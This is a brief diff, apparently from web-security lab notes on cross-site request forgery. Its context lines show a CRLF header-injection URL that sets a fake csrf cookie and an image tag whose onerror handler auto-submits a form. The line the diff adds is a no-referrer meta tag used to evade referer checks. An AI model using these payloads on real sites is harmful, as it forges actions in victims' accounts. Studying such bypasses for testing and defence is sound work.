@@ -9,3 +9,5 @@
 
 Cookie injection url --> /?search=test%0d%0aSet-Cookie:%20csrf=fake 
 <img src="$cookie-injection-url" onerror="document.forms[0].submit();"/> 
+
+<meta name="referrer" content="no-referrer"> 
